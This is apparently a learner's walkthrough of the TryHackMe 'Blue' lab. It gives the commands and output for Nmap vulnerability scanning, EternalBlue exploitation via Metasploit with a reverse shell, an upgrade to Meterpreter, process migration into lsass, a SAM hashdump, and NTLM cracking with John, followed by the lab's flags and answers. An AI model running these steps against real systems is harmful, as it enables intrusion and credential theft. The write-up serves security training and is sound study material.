# 🧩 BLUE — Penetration Test Cookbook

## 🟡 Task 1 – Recon  

*My notes, my thought process, and what I learned.*

---

### 🔻 Task: Scan the machine (Initial Nmap Scan)

TryHackMe gives a basic instruction but no question to answer.  
This is the first step: **enumeration**.

---

### 🧠 My Thought Process (Beginner Mindset)

I know “Scan the machine” means I need an **Nmap scan**, but I wasn’t sure which type.  
My instinct was to use my “general all-purpose scan”:

```bash
nmap -sC -sV -p- -oA scan_results <TARGET IP>
````

Why I chose this:

* `-sC` → default scripts
* `-sV` → version detection
* `-p-` → scan all ports
* `-oA` → save output in all formats

This is a **good scan**, but:

* It is **slow**
* It hits **all 65,535 ports**
* In THM networks, packet loss sometimes causes Nmap to “hang”
* The BLUE room expects you to focus on **vulnerability scripts**, not every port

I saw the scan “stalling” (the output repeating open/closed hosts, etc.) and decided to abort and delete the files.

Nothing wrong with this — scanning all ports is heavy.

---

### 💡 Why the THM Hint Command Worked Better

TryHackMe suggested:

```bash
nmap -sV -vv --script vuln <TARGET IP>
```

This command:

* Does **NOT** scan all ports
* Relies on **service detection results**
* Runs **vulnerability scanning scripts**
* Is tailored toward finding *old Windows vulnerabilities*, which is what “BLUE” is about

The BLUE machine is a Windows 7 system vulnerable to **EternalBlue (MS17-010)**.
Nmap has a script that checks for exactly that.

The scan output confirms:

```text
smb-vuln-ms17-010: VULNERABLE
```

This is exactly why the THM hint uses this command — it quickly leads beginners to the right vulnerability.

---

### 🧩 My Actual Commands

#### 🔹 Attempted “Full Everything Scan”

```bash
nmap -sC -sV -p- -oA scan_results 10.65.157.216
```

* The scan repeatedly printed “SYN Stealth Scan Timing…”
* No clear results returned
* I cancelled and deleted the autogenerated files
* This happens when network timing or Nmap retries take too long

📷 *Screenshot notes:* I captured the repeated timing lines and the `ls -l` directory listing afterward showing the leftover `.gnmap`, `.nmap`, `.xml`.

---

#### 🔹 Successful THM-Recommended Scan

```bash
nmap -sV -vv --script vuln 10.65.157.216
```

This produced **useful**, structured results:

* Open ports
* Service versions
* Vulnerabilities discovered
* SMB scripts including MS17-010

**Key findings from the scan:**

**Open Ports:**

```text
135/tcp     msrpc
139/tcp     netbios-ssn
445/tcp     microsoft-ds
3389/tcp    rdp
49152-49158/tcp  Windows high RPC port range
```

These ports → classic Windows 7 host.

**Vulnerabilities reported:**

```text
smb-vuln-ms17-010: VULNERABLE   <— EternalBlue
```

This is the main pivot point for the entire BLUE room.

---

### 🧠 What I Learned from This Step

#### ✔️ Lesson 1 — Use the right tool for the right job

Scanning all ports is good practice for real-world pentesting,
but in guided labs, the hint scan is often more focused.

#### ✔️ Lesson 2 — The `--script vuln` scan is a “Windows vuln” shortcut

Especially strong for:

* SMB (445)
* MS08-067
* MS17-010
* RDP vulnerabilities
* Windows RPC exposures

#### ✔️ Lesson 3 — Default scripts (`-sC`) ≠ vulnerability scripts

* `-sC` runs *default scan scripts*
* `--script vuln` runs *security vulnerability checks*

#### ✔️ Lesson 4 — If Nmap “hangs”

It's usually:

* packet loss
* full-port scan slowdowns
* retry delays
* network firewalls or throttling

Cancel + switch scan type = valid approach.

**This section now captures:**

* ✔ My attempt
* ✔ My reasoning
* ✔ What happened
* ✔ Why the hint works
* ✔ What to remember next time

---

### 🟦 Question: How many ports are open under port number 1000?

#### 🧠 My Thought Process

The task asked me to determine how many **open ports** existed with **port numbers lower than 1000**.

Since I had already completed enumeration using:

```bash
nmap -sV -vv --script vuln <TARGET IP>
```

…I returned to the scan output and reviewed all services marked as **open**, filtering only those whose port numbers were **less than 1000**.

---

#### 🔍 Relevant Output from Nmap

```text
135/tcp   open   msrpc
139/tcp   open   netbios-ssn
445/tcp   open   microsoft-ds
```

Each of these ports falls below the `1000` threshold and is marked as **open**.

No other open ports below 1000 were identified.

---

#### ✔️ Final Answer

✅ **3**

---

### 🟦 Question 2: What is this machine vulnerable to?

**Question format required:** `ms??-???` (example: ms08-067)

---

#### 🧠 My Thought Process

After performing the vulnerability scan using:

```bash
nmap -sV -vv --script vuln <TARGET IP>
```

…I reviewed the **Host Script Results** section of the output.
This area contains the results of Nmap’s **SMB vulnerability detection scripts**.

Since the BLUE machine is a Windows host with SMB exposed (`445/tcp`), I focused specifically on **SMB-related findings**.

---

#### 🔍 Relevant Output

```text
smb-vuln-ms17-010:
  VULNERABLE:
  Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
  State: VULNERABLE
  IDs: CVE:CVE-2017-0143
  Risk factor: HIGH
  A critical remote code execution vulnerability exists in Microsoft SMBv1 servers (ms17-010).
```

This script definitively confirms that the target machine is vulnerable to **Microsoft Security Bulletin MS17-010**, the flaw responsible for the **EternalBlue exploit** used by WannaCry and other attacks.

---

#### ✔️ Final Answer

✅ **ms17-010**

---

## 🟠 Task 2 – Gain Access

### 🧠 Objective

Exploit the vulnerable SMB service (MS17-010 / EternalBlue) to gain an initial shell on the target machine.

---

### 🟦 Step 1 — Start Metasploit

The first instruction is to start the Metasploit Framework:

```bash
msfconsole
```

This launches the exploitation environment I'll use to run the EternalBlue module.

---

### 🟦 Step 2 — Locate the Exploit Module

Since reconnaissance identified the target as vulnerable to **MS17-010**, my first thought was to search Metasploit for related modules:

```bash
search ms17-010
```

This produced a list of exploit and auxiliary options. Among them, the most relevant entry was:

```text
exploit/windows/smb/ms17_010_eternalblue
```

This module directly targets the EternalBlue vulnerability on **Windows 7 and similar systems**, which aligns with the OS identified in my scan results.

**TryHackMe question:** *What is the full path of the code? (Ex: exploit/....)*

#### ✔️ Answer

```text
exploit/windows/smb/ms17_010_eternalblue
```

---

### 🟦 Step 3 — Load the Exploit

I selected the exploit module using the index value from the search listing:

```bash
use 0
```

Confirming that I was now inside the proper exploit module shell:

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

---

### 🟦 Step 4 — Identify Required Options

To determine what needed configuration, I ran:

```bash
show options
```

Reviewing the output revealed that the required value missing was:

```text
RHOSTS
```

This represents the **Remote Host IP address** — the target machine for the exploit.

**TryHackMe question:** *What is the name of this value? (All caps for submission)*

#### ✔️ Answer

```text
RHOSTS
```

---

### 🟦 Step 5 — Set the Target IP

I configured the required variable for the exploit:

```bash
set RHOSTS 10.64.184.193
```

Verification:

```bash
show options
```

Confirmed that **RHOSTS** now contained the correct target IP address.

---

### 🟦 Step 6 — Change Payload Type

TryHackMe required altering the default payload:

```bash
set payload windows/x64/shell/reverse_tcp
```

Originally, the module was configured with:

```text
windows/x64/meterpreter/reverse_tcp
```

#### 🧠 Payload Clarification

* **Meterpreter payload**

  * Advanced interactive control session
  * Provides built-in post-exploitation commands (hashdump, migrations, screenshots, etc.)

* **Reverse shell payload**

  * Standard Windows command shell
  * Simpler and easier to observe for beginner learning
  * Directly drops you into `cmd.exe`

This lab requires the reverse shell for educational purposes so the connection behavior and DOS shell access are more visible.

**Without changing the payload**, the exploit still would have succeeded — but I would have received a **meterpreter shell instead of a raw command shell**, skipping some of the command-line interaction the room wants to demonstrate.

---

### 🟦 Step 7 — Execute the Exploit

Once configuration was complete, I launched exploitation:

```bash
exploit
```

*(Equivalent command: `run`)*

---

### 🟢 Exploitation Output Highlights

Key events seen in the terminal:

* Connection established to target
* OS verified: Windows 7 SP1 x64
* SMB pool grooming performed
* EternalBlue exploit fragments delivered
* Exploit reported **WIN**
* Shell session opened

---

### 🟢 Shell Access Achieved

Metasploit confirmed return access with the shell banner:

```text
Microsoft Windows [Version 6.1.7601]
```

Followed by an interactive Windows DOS shell:

```text
C:\Windows\system32>
```

This confirms **successful initial compromise** of the target system.

---

### 🧷 Step 8 — Background the Shell

Per task instructions, I backgrounded the session:

```bash
CTRL+Z
```

When prompted:

```text
Background session 1? [y/n]
```

I selected:

```text
y
```

This returned me to the Metasploit module prompt:

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

The shell remains active but is now running in the background for post-exploitation tasks.

---

### ✅ Task 2 – Gain Access: COMPLETE

**Achievements**

* ✅ Identified correct exploit module
* ✅ Configured required target parameters
* ✅ Selected educational payload
* ✅ Successfully executed EternalBlue exploit
* ✅ Achieved command-line shell access
* ✅ Maintained control of session via Metasploit backgrounding

---

## 🟡 Task 3 – Escalate

### 🧠 Objective

Upgrade the basic command shell to a full Meterpreter session and confirm escalation to `NT AUTHORITY\SYSTEM`.

---

### 🟦 Step 1 — Verify Active Shell Session

First, I listed all active sessions:

```bash
sessions
```

This showed my existing shell session:

```text
1  shell x64/windows  Microsoft Windows [Version 6.1.7601]
```

To learn more about session control, I checked available commands:

```bash
sessions -h
```

From the help menu, I identified:

```text
-u, --upgrade <id>  Upgrade a shell to a meterpreter session
```

---

### 🟦 Step 2 — Upgrade Shell to Meterpreter

I upgraded session 1 using:

```bash
sessions -u 1
```

Metasploit executed the following internally:

```text
post/multi/manage/shell_to_meterpreter
```

This staged the payload loader and opened a new Meterpreter session:

```text
Meterpreter session 2 opened
```

---

### 🟦 Step 3 — Identify the Post Module

TryHackMe requested the exact module path used for shell upgrading.

#### ✔️ Answer

```text
post/multi/manage/shell_to_meterpreter
```

---

### 🟦 Step 4 — Load the Module

To confirm and replicate manually:

```bash
search shell_to_meterpreter
use 0
```

Module prompt became:

```text
msf6 post(multi/manage/shell_to_meterpreter) >
```

Running:

```bash
show options
```

Revealed the required variable:

```text
SESSION
```

This confirmed I needed to specify the shell session to upgrade.

---

### 🟦 Step 5 — Run Module

```bash
set SESSION 1
run
```

This upgraded the shell again, returning a Meterpreter session successfully.

---

### 🟦 Step 6 — Interact with Meterpreter

```bash
sessions -i 2
```

Prompt:

```text
meterpreter >
```

---

### 🟦 Step 7 — Verify Privilege Escalation

To validate SYSTEM privileges:

```bash
getsystem
```

Result:

```text
Already running as SYSTEM
```

---

### 🟦 Step 8 — Verify Using Windows Shell

```bash
shell
whoami
```

Output:

```text
nt authority\system
```

---

### 🟦 Step 9 — Background the Windows Shell

```bash
CTRL+Z
```

Confirmed backgrounding:

```text
Background channel 1? [y/N]: y
```

---

### 🟦 Step 10 — Enumerate SYSTEM Processes

Inside Meterpreter:

```bash
ps
```

From the process list, I selected:

```text
716  lsass.exe  NT AUTHORITY\SYSTEM
```

---

### 🟦 Step 11 — Migrate to SYSTEM Process

```bash
migrate 716
```

Output:

```text
[*] Migrating from 2152 to 716...
[*] Migration completed successfully.
```

This ensured stable persistence under a SYSTEM process.

---

### ✅ Task 3 – Escalate: COMPLETE

**Achievements**

* ✅ Converted shell to Meterpreter
* ✅ Confirmed SYSTEM privileges
* ✅ Migrated into a stable SYSTEM process for persistence

---

## 🔴 Task 4 – Cracking

### 🧠 Objective

Dump user password hashes and crack the non-default user credential.

---

### 🟦 Step 1 — Dump SAM Hashes

Inside Meterpreter:

```bash
hashdump
```

Dumped users:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

---

### 🧠 SAM Explanation

**SAM = Security Accounts Manager**
It is the Windows database that stores local user credential hashes.

---

### 🟦 Step 2 — Identify Non-Default User

The non-default account:

```text
Jon
```

---

### 🟦 Step 3 — Write Hash to File

In a local (root) terminal:

```bash
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
```

---

### 🟦 Step 4 — Crack the NTLM Hash

Using **John the Ripper** with the `rockyou.txt` wordlist:

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

### 🟦 Cracking Result

```text
alqfna22
```

---

### ✔️ Final Answers

**Non-default user:**
✅ `Jon`

**Cracked password:**
✅ `alqfna22`

---

### ✅ Task 4 – Cracking: COMPLETE

**Achievements**

* ✅ SAM hashdump extraction
* ✅ NTLM offline cracking via John the Ripper
* ✅ Credential recovery confirmed

---

## 🟢 Task 5 – Find Flags

### 🧠 Objective

Locate all flags stored on the Windows filesystem.

---

### 🟦 Flag 1 — System Root

Navigated to root directory:

```bash
cd C:\
ls
cat flag1.txt
```

**Flag 1:**

```text
flag{access_the_machine}
```

---

### 🟦 Flag 2 — Windows Password Storage Directory

Passwords on Windows are stored within:

```text
C:\Windows\System32\config
```

Navigated there:

```bash
cd C:\Windows\System32\config
ls
cat flag2.txt
```

**Flag 2:**

```text
flag{sam_database_elevated_access}
```

---

### 🧠 Learning Tip — Flag2 Deletion Note

TryHackMe warns that this file may sometimes disappear.

Reason:

* Windows security mechanisms or **SAM file locks** can occasionally interfere with the lab VM snapshot environment.
* When this occurs the VM may delete or fail to restore the dropped flag file.
* **Rebooting the target and re-exploiting restores the correct file state.**

This is a lab-specific VM issue — not a real-world behavior — but good to know when a file mysteriously vanishes mid-exploitation.

---

### 🟦 Flag 3 — Administrator Documents

Administrative user home folders often contain sensitive material.

Navigated:

```bash
cd C:\Users
ls
cd Jon\Documents
cat flag3.txt
```

**Flag 3:**

```text
flag{admin_documents_can_be_valuable}
```

---

### ✅ Task 5 – Find Flags: COMPLETE

**Achievements**

* ✅ Navigated Windows filesystem
* ✅ Identified credential-related storage locations
* ✅ Located high-value admin user content

---

## ✅ ROOM COMPLETE – BLUE

### Final Outcomes

* ✅ Reconnaissance & vulnerability identification
* ✅ EternalBlue exploitation
* ✅ Privilege escalation to SYSTEM
* ✅ SAM password cracking
* ✅ Flag discovery across critical Windows directories
